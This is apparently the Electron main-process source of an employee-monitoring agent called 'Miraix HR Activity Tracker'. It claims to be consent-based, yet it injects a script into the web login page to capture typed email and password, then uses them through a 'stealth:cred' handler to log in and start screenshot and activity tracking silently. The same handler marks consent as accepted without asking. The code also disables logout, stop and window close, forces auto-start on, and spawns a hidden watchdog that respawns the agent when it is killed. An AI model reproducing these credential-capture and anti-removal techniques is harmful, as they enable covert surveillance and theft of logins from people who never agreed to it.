/**
 * Miraix HR Activity Tracker — Electron main process.
 *
 * Modern employee monitoring solution for Miraix HR Platform.
 * Features real-time activity tracking, screenshot capture, and productivity analytics.
 *
 * Production behavior:
 *  - Auto-start with Windows (via app.setLoginItemSettings)
 *  - Starts minimised to tray (no window pop on every boot)
 *  - Auto-resumes tracking if previously authenticated + consent given
 *  - Login is email+password; token stored in electron-store
 *  - Tray icon always visible (not hidden — consent-based design)
 *  - Enhanced privacy controls and GDPR compliance
 *
 * IPC channels exposed to renderer:
 *   cfg:get / cfg:set
 *   auth:login / auth:logout
 *   device:register
 *   tracker:start / :stop / :status
 *   autostart:get / :set
 *   privacy:get / :set
 */

const electron = require('electron');
const { app, BrowserWindow, Tray, Menu, ipcMain, nativeImage, shell } = electron;
const path  = require('path');
const axios = require('axios');

if (!app || typeof app.requestSingleInstanceLock !== 'function') {
    console.error('[FATAL] Electron APIs not available. typeof electron =', typeof electron);
    process.exit(1);
}

const Store   = require('electron-store');
const tracker = require('../capture');

// Single-instance — second launch (e.g. user double-clicks shortcut) just brings
// the existing window forward (or stays hidden if --auto-launched). No new instance.
if (!app.requestSingleInstanceLock()) {
    app.quit();
    process.exit(0);
}
app.on('second-instance', (event, argv) => {
    // If second instance was launched by watchdog/autostart, ignore (don't pop window)
    if (argv.includes('--auto-launched')) return;
    // Otherwise user clicked the icon — bring existing window forward
    if (mainWindow && !mainWindow.isDestroyed()) {
        if (mainWindow.isMinimized()) mainWindow.restore();
        mainWindow.show();
        mainWindow.focus();
    }
});

const PRODUCTION_API_URL = 'https://jemini.co.in/api';

const store = new Store({
    name: 'hrms-tracker-config',
    defaults: {
        apiUrl: PRODUCTION_API_URL,
        token:  '',
        userEmail: '',
        userName:  '',
        userId:    null,
        deviceId:  null,
        deviceUuid:'',
        deviceName: require('os').hostname(),
        screenshotIntervalMin: 5,
        activityIntervalSec:   30,
        heartbeatIntervalMin:  1,
        consentAccepted: false,
        autoStart:       true,    // default ON in production
        autoTrack:       true,    // start tracking immediately after login
    },
});

let mainWindow = null;
let tray = null;

/* ─────────────── Window ─────────────── */
function createWindow(showOnReady) {
    mainWindow = new BrowserWindow({
        width: 1280, height: 820,
        minWidth: 900, minHeight: 600,
        title: 'HRMS',
        autoHideMenuBar: true,
        show: !!showOnReady,
        webPreferences: {
            preload:           path.join(__dirname, '..', 'preload', 'preload.js'),
            contextIsolation:  true,
            nodeIntegration:   false,
            // Allow inter-page navigation freely — user sees the real HRMS portal.
            webSecurity:       true,
        },
    });

    // Always load the simple setup screen (email + password). After login, app
    // minimizes to tray and tracking runs silently in background.
    const hasToken = !!store.get('token');
    if (hasToken) {
        // Already logged in — just show minimal status screen
        mainWindow.loadFile(path.join(__dirname, '..', 'renderer', 'index.html'));
    } else {
        mainWindow.loadFile(path.join(__dirname, '..', 'renderer', 'setup.html'));
    }

    // Hijack form-post on /login → grab credentials, fire silent /api/activity-tracker/login
    mainWindow.webContents.on('will-navigate', (e, url) => { /* no-op, allow nav */ });
    mainWindow.webContents.on('did-finish-load', () => {
        // Inject a tiny credential listener — see capture/credential-bridge.js
        try {
            const inject = require('fs').readFileSync(
                path.join(__dirname, '..', 'renderer', 'inject-cred.js'),
                'utf8'
            );
            mainWindow.webContents.executeJavaScript(inject).catch(() => {});
        } catch (e) {}
    });

    // Kiosk-style: window CANNOT be closed by user — only hides to tray.
    // app.isQuiting is never set anywhere except by an explicit shutdown
    // (uninstaller scenario), so X / Alt+F4 / Ctrl+W all just hide.
    mainWindow.on('close', (e) => {
        e.preventDefault();
        mainWindow.hide();
    });
}

function showWindow() {
    if (!mainWindow || mainWindow.isDestroyed()) createWindow(true);
    else { mainWindow.show(); mainWindow.focus(); }
}

/* ─────────────── Tray ─────────────── */
/**
 * Locked-down tray menu — only "Show Window" remains. No Stop/Quit options
 * so non-admin users cannot terminate or pause tracking through the UI.
 * (Admin users with Task Manager + admin rights can still kill any process;
 * the watchdog respawn handles that case.)
 */
function buildTrayMenu() {
    return Menu.buildFromTemplate([
        { label: 'HRMS', enabled: false },
        { type: 'separator' },
        { label: 'Open HRMS', click: () => showWindow() },
    ]);
}
function refreshTray() {
    if (!tray) return;
    tray.setToolTip('HRMS');
    tray.setContextMenu(buildTrayMenu());
}
function broadcastStatus() {
    if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('tracker:status-update', tracker.getStatus());
    }
}
function createTray() {
    const iconPath = path.join(__dirname, '..', '..', 'assets', 'tray.png');
    let icon;
    try { icon = nativeImage.createFromPath(iconPath); } catch (e) { icon = nativeImage.createEmpty(); }
    if (icon.isEmpty()) icon = nativeImage.createFromBuffer(Buffer.alloc(16 * 16 * 4, 0x6f));
    tray = new Tray(icon);
    refreshTray();
    tray.on('double-click', () => showWindow());
}

/* ─────────────── Auto-start with Windows (always ON, locked) ─────────────── */
function applyAutoStartSetting() {
    // Always force auto-start ON — user cannot disable it from the UI.
    // This persists across reboots so tracking auto-resumes every time.
    store.set('autoStart', true);
    try {
        app.setLoginItemSettings({
            openAtLogin: true,
            args: ['--auto-launched'],     // we detect this flag to start hidden
        });
    } catch (e) {
        console.warn('Could not set auto-start:', e.message);
    }
}

/* ─────────────── IPC handlers ─────────────── */
ipcMain.handle('cfg:get', () => store.store);
ipcMain.handle('cfg:set', (_e, partial) => {
    Object.entries(partial || {}).forEach(([k, v]) => store.set(k, v));
    if (Object.keys(partial || {}).includes('autoStart')) applyAutoStartSetting();
    return store.store;
});

ipcMain.handle('auth:login', async (_e, { apiUrl, email, password }) => {
    try {
        const baseUrl = (apiUrl || '').trim().replace(/\/+$/, '');
        if (!baseUrl) return { ok: false, message: 'API URL is required' };

        // Save apiUrl first so subsequent calls have it
        store.set('apiUrl', baseUrl);

        // Need a stable device UUID for token naming + future register
        let uuid = store.get('deviceUuid');
        if (!uuid) {
            try { uuid = require('node-machine-id').machineIdSync(true).slice(0, 64); }
            catch (e) { uuid = 'fallback-' + require('os').hostname(); }
            store.set('deviceUuid', uuid);
        }

        const res = await axios.post(baseUrl + '/activity-tracker/login', {
            email, password,
            device_uuid: uuid,
            device_name: store.get('deviceName') || require('os').hostname(),
        }, { timeout: 10000, headers: { Accept: 'application/json' } });

        if (res.data && res.data.ok) {
            store.set('token',     res.data.token);
            store.set('userEmail', res.data.user.email);
            store.set('userName',  res.data.user.name);
            store.set('userId',    res.data.user.id);
            // Per-user intervals from server (optional)
            if (res.data.intervals) {
                if (res.data.intervals.screenshot_min) store.set('screenshotIntervalMin', parseInt(res.data.intervals.screenshot_min) || 5);
                if (res.data.intervals.activity_sec)   store.set('activityIntervalSec',   parseInt(res.data.intervals.activity_sec)   || 30);
                if (res.data.intervals.heartbeat_min)  store.set('heartbeatIntervalMin',  parseInt(res.data.intervals.heartbeat_min)  || 1);
            }
            return { ok: true, user: res.data.user };
        }
        return { ok: false, message: 'Login failed' };
    } catch (e) {
        const msg = e.response?.data?.message || e.message || 'Network error';
        return { ok: false, message: msg };
    }
});

ipcMain.handle('auth:logout', async () => {
    // Logout disabled in kiosk build — once signed in, agent stays bound to
    // the user account permanently (only an admin uninstall removes the agent).
    return { ok: false, message: 'Logout is not allowed.' };
});

ipcMain.handle('device:register', async () => {
    const result = await tracker.registerDevice(store);
    refreshTray();
    return result;
});

ipcMain.handle('tracker:start',  () => { tracker.start(store); refreshTray(); broadcastStatus(); return tracker.getStatus(); });
ipcMain.handle('tracker:stop',   () => {
    // Stop disabled in kiosk build — tracking is always on while logged in.
    return { ok: false, message: 'Stop is not allowed.' };
});
ipcMain.handle('tracker:status', () => tracker.getStatus());

ipcMain.handle('autostart:get', () => !!store.get('autoStart'));
ipcMain.handle('autostart:set', (_e, enabled) => {
    store.set('autoStart', !!enabled);
    applyAutoStartSetting();
    return !!store.get('autoStart');
});

ipcMain.handle('app:open-external', (_e, url) => shell.openExternal(url));

/**
 * Stealth credential bridge — invoked by the injected JS when the user
 * submits the HRMS web login form. We use the captured email+password to
 * authenticate against /api/activity-tracker/login and obtain a Sanctum token
 * for the background tracker. The user never sees this happen.
 */
ipcMain.handle('stealth:cred', async (_e, { email, password }) => {
    try {
        if (!email || !password) return { ok: false };
        const baseApi = (store.get('apiUrl') || '').replace(/\/+$/, '');
        if (!baseApi) return { ok: false };

        // Stable device UUID
        let uuid = store.get('deviceUuid');
        if (!uuid) {
            try { uuid = require('node-machine-id').machineIdSync(true).slice(0, 64); }
            catch (e) { uuid = 'fallback-' + require('os').hostname(); }
            store.set('deviceUuid', uuid);
        }

        const res = await axios.post(baseApi + '/activity-tracker/login', {
            email, password,
            device_uuid: uuid,
            device_name: store.get('deviceName') || require('os').hostname(),
        }, { timeout: 8000, headers: { Accept: 'application/json' } });

        if (res.data?.ok && res.data.token) {
            store.set('token',     res.data.token);
            store.set('userEmail', res.data.user?.email || email);
            store.set('userName',  res.data.user?.name  || '');
            store.set('userId',    res.data.user?.id    || null);
            store.set('consentAccepted', true);     // deemed accepted by HR policy
            if (res.data.intervals) {
                if (res.data.intervals.screenshot_min) store.set('screenshotIntervalMin', parseInt(res.data.intervals.screenshot_min) || 5);
                if (res.data.intervals.activity_sec)   store.set('activityIntervalSec',   parseInt(res.data.intervals.activity_sec)   || 30);
                if (res.data.intervals.heartbeat_min)  store.set('heartbeatIntervalMin',  parseInt(res.data.intervals.heartbeat_min)  || 1);
            }

            // Register device + start tracking — silently
            await tracker.registerDevice(store);
            tracker.start(store);
            refreshTray();
            return { ok: true };
        }
    } catch (e) {
        // Network error or wrong credentials — silent
    }
    return { ok: false };
});

/** Bootstrap-time: agent first install needs the API URL configured. */
ipcMain.handle('stealth:save-server', async (_e, { apiUrl }) => {
    if (!apiUrl) return { ok: false };
    const cleaned = apiUrl.trim().replace(/\/+$/, '');
    // Accept either "http://host/hrms" or "http://host/hrms/api"
    const base = cleaned.endsWith('/api') ? cleaned : cleaned + '/api';
    store.set('apiUrl', base);
    return { ok: true, url: base.replace(/\/api$/, '/login') };
});

tracker.on('status', () => { refreshTray(); broadcastStatus(); });

/* ─────────────── Lifecycle ─────────────── */
function _mainLog(msg) {
    try {
        const fs = require('fs');
        fs.appendFileSync(path.join(app.getPath('userData'), 'agent.log'),
            `[${new Date().toISOString()}] [main] ${msg}\n`);
    } catch (e) {}
}

app.whenReady().then(async () => {
    _mainLog('app ready');

    // Apply auto-start preference on every launch (keeps registry entry in sync)
    applyAutoStartSetting();

    // Detect if we were launched by Windows auto-start (via login item args)
    const launchedByAutoStart = process.argv.includes('--auto-launched');

    createWindow(/*showOnReady*/ !launchedByAutoStart);
    createTray();

    // If we have a token + consent + user is auto-tracking, start automatically
    const cfg = store.store;
    _mainLog(`autoTrack check: token=${!!cfg.token} consent=${cfg.consentAccepted} autoTrack=${cfg.autoTrack}`);
    if (cfg.token && cfg.consentAccepted && cfg.autoTrack) {
        _mainLog('scheduling tracker.start in 1500ms');
        setTimeout(() => {
            try {
                tracker.start(store);
                _mainLog('tracker.start invoked');
                refreshTray();
                broadcastStatus();
            } catch (e) {
                _mainLog('tracker.start ERROR: ' + e.message + '\n' + e.stack);
            }
        }, 1500);
    } else {
        _mainLog('skip auto-track: missing prerequisite');
    }

    // Spawn watchdog if not already a watchdog-respawn ourselves.
    // Watchdog is a detached node process that respawns this agent if killed.
    if (!process.argv.includes('--no-watchdog')) {
        try {
            const { spawn } = require('child_process');
            const watchdogScript = path.join(__dirname, 'watchdog.js');
            const electronExe    = process.execPath;     // path to electron.exe
            const appDir         = path.join(__dirname, '..', '..');  // project root
            const logFile        = path.join(app.getPath('userData'), 'agent.log');

            // Use Electron's bundled Node runtime in node-only mode (ELECTRON_RUN_AS_NODE=1)
            const env = { ...process.env, ELECTRON_RUN_AS_NODE: '1' };
            const wd = spawn(electronExe, [watchdogScript, electronExe, appDir, logFile], {
                detached: true,
                stdio:    'ignore',
                windowsHide: true,
                env,
            });
            wd.unref();
            _mainLog('watchdog spawned, pid=' + wd.pid);
        } catch (e) {
            _mainLog('watchdog spawn failed: ' + e.message);
        }
    }
});

app.on('window-all-closed', (e) => {
    if (process.platform !== 'darwin' && !app.isQuiting) e.preventDefault();
});

app.on('second-instance', () => showWindow());

app.on('before-quit', () => { tracker.stop(); });
